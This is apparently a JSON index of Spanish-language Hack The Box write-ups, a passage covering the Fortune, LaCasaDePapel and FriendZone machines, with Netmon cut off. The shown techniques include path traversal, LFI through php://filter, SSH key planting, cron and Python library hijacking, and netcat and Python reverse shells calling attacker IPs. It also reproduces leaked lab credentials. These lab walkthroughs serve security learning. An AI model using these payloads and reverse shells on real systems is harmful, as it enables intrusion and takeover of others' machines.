\u0026#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg\u0026#39;] pass_dba = \u0026#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz\u0026#34; for key in list_keys: k = str(user) r = decrypt(pass_dba, k) print(k +\u0026#39; : \u0026#39; + r) Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (pass_dba) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:\nNuestra contraseña para el usuario dba y para root es R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera root.txt.\n","description":"Realizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH. Finalmente encontramos y crackeamos un hash de una base de datos para escalar privilegios.","id":198,"section":"posts","tags":["openssl","rpcinfo","nfs","showmount","authpf"],"title":"Hack The Box - Fortune","uri":"https://sckull.github.io/posts/fortune/"},{"content":"\rLaCasaDePapel con tematica en la serie de Netflix, expone la consola de desarrollo Psy Shell por medio de la cual obtuvimos certificados para acceder a un area restringida. Escribimos nuestra clave publica en los archivos SSH para obtener acceso. Finalmente escalamos privilegios mediante un CronJob.\nInformacion de la Maquina Nombre LaCasaDePapel OS Linux Puntos 20 Dificultad Facil IP 10.10.10.131 Maker thek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7, 5, 6.1, 3.9, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 5, 8, 2, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de todos los puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10 masscan -p1-65535,U:1-65535 10.10.10.131 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 443/tcp on 10.10.10.131 Discovered open port 22/tcp on 10.10.10.131 Discovered open port 80/tcp on 10.10.10.131 Discovered open port 21/tcp on 10.10.10.131 Escaneo de puertos encontrados con MASSCAN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST Nmap scan report for 10.10.10.131 Host is up (0.22s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA) | 256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA) |_ 256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519) 80/tcp open http Node.js Express framework |_http-title: La Casa De Papel 443/tcp open ssl/http Node.js Express framework | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: | http/1.1 |_ http/1.0 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds Agregamos lacasadepapel.htb a nuestro archivo /etc/hosts.\nHTTPS Al visitar la pagina en https nos muestra un error de certificado.\nHTTP Al visitar la pagina nos muestra una imagen QR.\nFTP Encontramos ftp en su version vftpd 2.3.4 el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de Psy Shell, intentamos conectarnos al puerto 6200, y encontramos una shell de Psysh,y con el comando dir la clase $tokyo.\nExpliting Vsftpd\nGithub - Exploit\nUtilizamos el comando \u0026lsquo;show $tokyo\u0026rsquo; para mostrar el codigo que en este se encuentra.\n1 2 3 4 5 6 7 8 class Tokyo { private function sign($caCert,$userCsr) { $caKey = file_get_contents(\u0026#39;/home/nairobi/ca.key\u0026#39;); $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [\u0026#39;digest_alg\u0026#39;=\u0026gt;\u0026#39;sha256\u0026#39;]); openssl_x509_export($userCert, $userCertOut); return $userCertOut; } } Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: file_get_contents(archivo).\nIBM - Certificate\nGithub - Certificate\ntecadmin - Certificate\nGeneramos nuestro certificado para firefox con los siguientes comandos:\n1 openssl req -key ca.key -new -x509 -days 365 -out lacasadepapelhtb.crt -subj \u0026#34;/C=US/ST=New York/L=Brooklyn/O= La Casa De Papel/CN=lacasadepapel.htb\u0026#34; 1 openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapelhtb.p12 Importamos nuestro certificado a firefox y al visitar la pagina nos muestra lo siguiente:\nAl visitar SEASON-1 nos muestra una lista de videos en formato avi al visitar o dar click a uno de ellos nos descarga un archivo, vacio.\n01.avi\nhttps://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp Dicha url en su parte final (/U0VBU09OLTEvMDEuYXZp) esta codificada en base64, por lo que al decodificarla obtenemos el valor de SESEASON-1/01.avi, sabiendo esto podemos codificar ../../../../etc/passwd en base64 para observar que pasa si codificamos una ruta de un archivo para descargarla.\nAsi es como obtenemos el archivo /etc/passwd, ahora que sabemos como descargar archivos vamos a descargar el id_rsa (../.ssh/id_rsa) del usuario berlin y asi conectarnos mediante el servicio ssh.\nPor alguna razon el id_rsa del usuario berlin no funciona en si mismo, funciona con el usuario professor y dali. En el caso de dali debemos de agregar nuestra clave al archivo authorized_keys mediante PSYSH.\nUSUARIO DALI PSYSH Debugging Psysh\nUtilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.\n$file = file_get_contents(\u0026#39;/etc/passwd\u0026#39;);echo $file; Al revisar dicho archivo vemos que el usuario dali tiene como shell psysh y su directorio principal es /home/dali.\netcpasswd format\nYa que sabemos que psysh es ejecutado por el usuario dali y tenemos acceso a su directorio principal, podemos generar y agregar nuestra id_rsa.pub a el archivo authorized_keys del usuario dali, para luego poder conectarnos por medio de ssh.\n1 $text = \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull\u0026#34;;$filename = \u0026#34;/home/dali/.ssh/authorized_keys\u0026#34;;$fh = fopen($filename, \u0026#34;a\u0026#34;);fwrite($fh, $text);fclose($fh); Escribimos y verificamos.\nAhora nos conectamos con la clave de \u0026lsquo;berlin\u0026rsquo;.\nUSUARIO PROFESSOR - SSH Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.\nUSER - FLAG Al enumerar las carpetas de los usuarios encontramos nuestra bandera user.txt en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los crons que se ejecutan.\nEncontramos un proceso que se ejecuta que utiliza node y un archivo memcached.js.\nEl archivo memcached.js se encuentra en nuestra carpeta principal (/home/professor) pero no tenemos permisos, tambien se encuentra otro archivo llamadao memcached.ini que contiene un comando que ejecuta node con el archivo memcached.js.\nHacemos una prueba de ping con el usuario root a nuestra ip, agregamos lo siguiente a memcached.ini, pero primero renombramos el archivo anterior a otro ya que no tenemos permisos, creamos un nuevo archivo con el mismo nombre y agregamos lo siguiente.\nY obtenemos la respuesta de la maquina.\nPara obtener una shell inversa creamos un archivo con nuestra shell inversa dentro, y agregamos su ejecucion dentro del archivo memcached.ini.\nbatman.sh\n1 echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.12.119 7878 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/batman.sh 1 2 3 memcached.ini [program:memcached] command = sudo -u root sh /tmp/batman.sh ","description":"LaCasaDePapel con tematica en la serie de Netflix, expone la consola de desarrollo Psy Shell por medio de la cual obtuvimos certificados para acceder a un area restringida. Escribimos nuestra clave publica en los archivos SSH para obtener acceso. Finalmente escalamos privilegios mediante un CronJob.","id":199,"section":"posts","tags":["ftp","openssl","cron","psy shell"],"title":"Hack The Box - LaCasaDePapel","uri":"https://sckull.github.io/posts/lacasadepapel/"},{"content":"\rFriendZone es una maquina CTF Like donde encontramos una vulnerabilidad LFI en uno de los subdominios donde obtuvimos acceso en conjunto con un recurso de SAMBA. Encontramos en un archivo de configuracion una contraseña para el siguiente usuario para finalmente realizar Python Library Hijacking para escalar privilegios.\nInformacion de la Maquina Nombre FriendZone OS Linux Puntos 20 Dificultad Facil IP 10.10.10.123 Maker askar\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.3, 4.4, 4.1, 5.9, 5.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-10 14:12 PST Nmap scan report for 10.10.10.123 Host is up (0.20s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.20 seconds FTP Haciendo un login como usuario anonimo no encontramos nada en este puerto.\nENUMERATION HTTP 1 2 3 4 gobuster -u 10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /wordpress (Status: 301) /robots.txt (Status: 200) Ninguno de los directorios y archivos encontrados en el puerto 80 (HTTP) son de ayuda, pero en el index de la pagina aparece un dominio que podriamos utilizar.\nfriendzoneportal.red. Agregamos el dominio al archivo host (/etc/hosts) y encontramos que la pagina tiene contenido en el protocolo https, procedemos a enumerar los directorios y archivos.\nHTTPS 1 2 gobuster -u https://friendzoneportal.red/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -k -x php,txt,html -t 35 -q /index.html (Status: 200) Samba Utilizando la herramienta smbclient para enumerar los sharenames que estan en el servicio de samba.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 smbclient -L 10.10.10.123 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC En uno de los sharenames podemos ver que Files tiene un comentario que nos dice se encuentra en la carpeta local /etc/files. al logearnos a general encontramos unas credenciales y una frase creds for the admin THING que podria hacer referencia a algun panel de administracion, en este sharename no tenemos permisos suficientes para subir o escribir archivos.\n1 2 3 4 5 6 7 smbclient \\\\\\\\10.10.10.123\\\\general Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jan 16 12:10:51 2019 .. D 0 Wed Jan 23 13:51:02 2019 creds.txt N 57 Tue Oct 9 16:52:42 2018 creds.txt\n1 2 creds for the admin THING: admin:WORKWORKHhallelujah@# Utilizando las credenciales que encontramos anteriormente, en Development no encontramos nada pero si podemos escribir o subir archivos, mas no ejecutarlos.\n1 2 3 4 5 6 smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@# smb: \\\u0026gt; ls . D 0 Sun Feb 10 19:12:08 2019 .. D 0 Wed Jan 23 13:51:02 2019 php-reverse-shell.php N 5493 Sat Feb 9 18:47:48 2019 SUBDOMINIOS Utilizando la ip y el dominio anteriormente utilizado en https, encontramos varios subdominios:\n1 2 3 4 5 6 7 8 9 10 11 dig axfr friendzoneportal.red @10.10.10.123 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 Ver Nmap scan \u0026ndash;\u0026gt; friendzone.red (CommonName)\n1 2 3 4 5 6 7 8 9 10 dig friendzone.red axfr @10.10.10.123 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 Agregamos los subdominios a /etc/hosts.\n1 2 3 4 5 6 7 8 admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red ENUMERANDO DIRECTORIOS friendzone.red /js/js/\nuploads.friendzone.red 1 2 3 /files /files/note /upload.php hr.friendzone.red EMPTY\nadministrator1.friendzone.red 1 2 3 /dashboard.php /login.php /timestamp.php LFI - Securityartwork\nLFI - xapax\nLFI administrator1.friendzone.red En el primer subdominio econtramos un login y utilizando las credenciales nos muestra un mensaje, donde nos indica que para mostrar la imagen del script debemos de insertar lo siguiente: ?image_id=a.jpg\u0026amp;pagename=timestamp\nAl realizar dicho request a la pagina obtenemos la imagen y lo que parece el tiempo en que se ejecuto el programa.\nSi nos concentramos en la solicitud de la pagina podemos ver que existe un parametro que llama(include $_GET[\u0026lsquo;pagina\u0026rsquo;];) a una pagina pagename=timestamp, anteriormente enumeramos los directorios y archivos de la pagina. Al intentar con el archivo login.php en lugar de timestamp nos muestra el siguiente mensaje.\nPodemos observar que la pagina es vulnerable a ataques de LFI, cuando se hace la solicitud del archivo (timestamp,login) este lo ejecuta y lo muestra por debajo como en la figura anterior. Para poder saltarnos la ejecucion podemos utilizar un filtro de php en este caso php://filter/convert.base64-encode/resource=archivophp y asi obtener el codigo fuente de los archivos locales en base64 para luego decodificarlo.\npagename=php://filter/convert.base64-encode/resource=dashboard\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;title\u0026gt;FriendZone Admin !\u0026lt;/title\u0026gt;\u0026#34;; $auth = $_COOKIE[\u0026#34;FriendZoneAuth\u0026#34;]; if ($auth === \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; if(!isset($_GET[\u0026#34;image_id\u0026#34;])){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;image_name param is missed !\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;please enter it to show the image\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;default is image_id=a.jpg\u0026amp;pagename=timestamp\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; }else{ $image = $_GET[\u0026#34;image_id\u0026#34;]; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;img src=\u0026#39;images/$image\u0026#39;\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Something went worng ! , the script include wrong param !\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; include($_GET[\u0026#34;pagename\u0026#34;].\u0026#34;.php\u0026#34;); //echo $_GET[\u0026#34;pagename\u0026#34;]; } }else{ echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;You can\u0026#39;t see the content ! , please login !\u0026lt;/center\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; pagename=php://filter/convert.base64-encode/resource=timestamp\n1 2 3 4 \u0026lt;?php $time_final = time() + 3600; echo \u0026#34;Final Access timestamp is $time_final\u0026#34;; ?\u0026gt; pagename=php://filter/convert.base64-encode/resource=../www/admin/login\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $username = $_POST[\u0026#34;username\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; //echo $username === \u0026#34;admin\u0026#34;; //echo strcmp($username,\u0026#34;admin\u0026#34;); if ($username===\u0026#34;admin\u0026#34; and $password===\u0026#34;WORKWORKHhallelujah@#\u0026#34;){ setcookie(\u0026#34;FriendZoneAuth\u0026#34;, \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;, time() + (86400 * 30)); // 86400 = 1 day echo \u0026#34;Login Done ! visit /dashboard.php\u0026#34;; }else{ echo \u0026#34;Wrong !\u0026#34;; } ?\u0026gt; OBTENIENDO ACCESO Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename Files es en /etc/Files por lo que concluimos que Development y general estan en la carpeta /etc/Development y /etc/general, de los cuales solo tenemos acceso a Development, procedemos a subir un archivo en samba con el sharename Development y hacer una solicitud a la carpeta /etc/Development/NuestroArchivo.\n1 echo \u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;/center\u0026gt;\u0026lt;h1\u0026gt;Yo soy Batman\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;;?\u0026gt;\u0026#39; \u0026gt; batman.php Smbclient smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@#\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; put batman.php\rputting file batman.php as \\batman.php (0.0 kb/s) (average 0.0 kb/s) Solicitud:\nhttps://administrator1.friendzone.red/dashboard.php?pagename=php://filter/resource=/etc/Development/batman\nComo podemos ver nuestro archivo con un simple texto se ejecuta, de la misma forma podemos ejecutar comandos mediante php y asi obtener una shell inversa.\n1 2 echo \u0026#39;\u0026lt;?php system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.78 7878 \u0026gt;/tmp/f\u0026#34;);?\u0026gt;\u0026#39; \u0026gt; batman_sh.php put batman_sh.php nc -lvp 7878 USER Flag Para el user flag solo falto un poco de enumeracion en los archivos locales y en la configuracion de la base de datos mysql del servidor encontramos un usuario y contraseña de un usuario.\nssh friend@10.10.10.123\rPassword: Agpyu12!0.213$ ROOT SHELL Utilizando pspy para encontrar tareas que se ejecutan como usuario root logramos ver una que se encuentra dentro de la carpeta /opt, es un script escrito en python llamado reporter.py, el cual tiene permisos root, dentro del script podemos ver que importa la libreria os e imprime algunos mensajes.\nGithub - pspy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = \u0026#34;admin1@friendzone.com\u0026#34; from_address = \u0026#34;admin2@friendzone.com\u0026#34; print \u0026#34;[+] Trying to send email to %s\u0026#34;%to_address #command = \u0026#39;\u0026#39;\u0026#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \u0026#34;PAPAP\u0026#34;\u0026#39;\u0026#39;\u0026#39; #os.system(command) # I need to edit the script later # Sam ~ python developer Utilizando la tecnica de Python Library Hijacking podemos obtener una shell inversa editando la libreria os.py que se encuentra en /usr/lib/python2.7/os.py podemos utilizar el siguiente codigo.\nrastating - Python Library Hijacking\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.15.126\u0026#34;,7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); import os import pty import socket lhost = \u0026#34;10.10.15.126\u0026#34; lport = 7878 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close() Como podemos ver en el script se ejecuta cada medio minuto por lo cual obtendremos una shell inversa como usuario root.\n","description":"FriendZone es una maquina CTF Like donde encontramos una vulnerabilidad LFI en uno de los subdominios donde obtuvimos acceso en conjunto con un recurso de SAMBA. Encontramos en un archivo de configuracion una contraseña para el siguiente usuario para finalmente realizar Python Library Hijacking para escalar privilegios.","id":200,"section":"posts","tags":["smbclient","dig","lfi","cron","python library hijacking"],"title":"Hack The Box - FriendZone","uri":"https://sckull.github.io/posts/friendzone/"},{"content":"\rNos topamos con el puerto FTP con autenticacion minima, pudimos acceder a la archivos de configuracion de PRTG Network Monitor donde encontramos credenciales en archivo de configuracion. El software de monitoreo tiene una vulnerabilidad de Command Injection el cual aprovechamos para ejecutar una shell inversa y obtener privilegios de administrador.\nInformacion de la Maquina Nombre Netmon OS Windows Puntos 20 Dificultad Facil IP 10.10.10.152 Maker mrb3n\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.3, 6.4, 6.7, 3.3, 3.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 9, 10, 0, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Al realizar un escaneo con nmap nos muestra servicios ftp, 